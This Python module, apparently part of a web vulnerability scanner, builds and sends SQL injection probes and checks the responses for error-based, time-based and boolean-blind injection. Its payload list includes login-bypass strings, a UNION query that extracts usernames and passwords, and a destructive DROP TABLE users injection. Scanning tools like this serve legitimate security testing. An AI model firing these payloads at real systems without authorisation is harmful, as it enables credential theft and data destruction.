import time

from core.http import fetch

SQL_PAYLOADS = [
    "' OR '1'='1' -- ",
    "' OR '1'='1' #",
    "' OR 1=1 -- ",
    "admin'--",
    "' UNION SELECT NULL--",
    "' UNION SELECT username, password FROM users--",
    "' AND 1=0 UNION SELECT 1,@@version--",
    "' OR SLEEP(5)--",
    "' AND LENGTH(database())>0--",
    "' AND ASCII(SUBSTRING((SELECT user()),1,1))>64--",
    "' AND EXISTS(SELECT * FROM users)--",
    "' OR 1 GROUP BY CONCAT(username,0x3a,password)--",
    "' OR 1 HAVING 1=1--",
    "' OR 1=1 UNION ALL SELECT 1,2,3--",
    "1); DROP TABLE users;--",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "' OR 'a'='a",
    "' OR 'a'='b",
    "0 OR 1=1",
    "0 AND 1=0",
]

DEFAULT_PARAM = "id"


def generate_tasks(url, config):
    tasks = []
    
    # Merge default param with discovered params
    default_param = config.get("sql", {}).get("param", DEFAULT_PARAM)
    discovered = config.get("discovered_params", [])
    all_params = list(dict.fromkeys([default_param] + discovered))
    
    limit = min(len(SQL_PAYLOADS), config.get("payloads", {}).get("sql", len(SQL_PAYLOADS)))
    
    for param in all_params:
        for payload in SQL_PAYLOADS[:limit]:
            tasks.append({
                "url": url,
                "method": "GET",
                "params": {param: payload},
                "type": "SQL Injection",
                "executor": test_sql_injection,
            })
            
        if config.get("sql", {}).get("time_blind", True):
            tasks.append({
                "url": url,
                "method": "GET",
                "sql_param": param,
                "time_payload": config.get("sql", {}).get("sleep_payload", "' OR SLEEP(2)-- "),
                "type": "SQL Injection",
                "executor": test_sql_time_blind,
            })
            
        # Boolean-based blind payloads
        tasks.append({
             "url": url,
             "method": "GET",
             "sql_param": param,
             "type": "SQL Injection",
             "executor": test_sql_boolean_blind,
        })
            
    return tasks


async def test_sql_injection(session, task):
    try:
        text, resp = await fetch(session, task["url"], params=task["params"])
        if resp:
            body = text or ""
            sql_errors = [
                "sql syntax",
                "mysql_fetch",
                "ora-",
                "postgresql",
                "sqlite",
                "syntax error",
                "unclosed quotation mark",
                "unknown column",
                "mysql_num_rows",
                "sqlstate",
                "warning: mysql",
                "execute() failed",
                "sqlite3.operationalerror",
                "sqlite_exception",
                "mysql syntax",
                "mysqli_sql_exception",
            ]
            low = body.lower()
            error_found = any(error in low for error in sql_errors)
            return {
                "type": "SQL Injection",
                "url": task["url"],
                "params": task["params"],
                "vulnerable": error_found,
                "response": body[:1000],
                "vector": "error-based",
                "error_signatures": [e for e in sql_errors if e in low],
            }
    except Exception as exc:
        return {"type": "SQL Injection", "url": task["url"], "error": str(exc), "vulnerable": False}
    return {"type": "SQL Injection", "url": task["url"], "vulnerable": False}


async def test_sql_time_blind(session, task):
    """Compare latency for benign vs SLEEP-style payload (MySQL-oriented)."""
    try:
        url = task["url"]
        param = task.get("sql_param", DEFAULT_PARAM)
        sleep_pl = task.get("time_payload", "' OR SLEEP(2)-- ")
        t0 = time.perf_counter()
        await fetch(session, url, params={param: "1"})
        baseline = time.perf_counter() - t0
        t1 = time.perf_counter()
        await fetch(session, url, params={param: sleep_pl})
        delayed = time.perf_counter() - t1
        threshold = max(baseline * 3, 0.15) + 1.0
        hit = delayed >= threshold and delayed > baseline + 0.8
        return {
            "type": "SQL Injection",
            "url": url,
            "vulnerable": hit,
            "vector": "time-based",
            "timings": {"baseline_s": round(baseline, 4), "payload_s": round(delayed, 4)},
            "note": "Compare timings; confirm manually (network jitter causes FPs).",
        }
    except Exception as exc:
        return {"type": "SQL Injection", "url": task.get("url"), "error": str(exc), "vulnerable": False}

async def test_sql_boolean_blind(session, task):
    try:
        url = task["url"]
        param = task["sql_param"]
        
        # True condition
        text_true, resp_true = await fetch(session, url, params={param: "1' AND '1'='1"})
        # False condition
        text_false, resp_false = await fetch(session, url, params={param: "1' AND '1'='2"})
        
        if text_true and text_false and abs(len(text_true) - len(text_false)) > 50:
            return {
                "type": "SQL Injection",
                "url": url,
                "vulnerable": True,
                "vector": "boolean-based",
                "evidence": f"Len Diff: {abs(len(text_true) - len(text_false))} bytes",
            }
        return {"type": "SQL Injection", "url": url, "vulnerable": False}
    except Exception as exc:
        return {"type": "SQL Injection", "url": task["url"], "error": str(exc), "vulnerable": False}
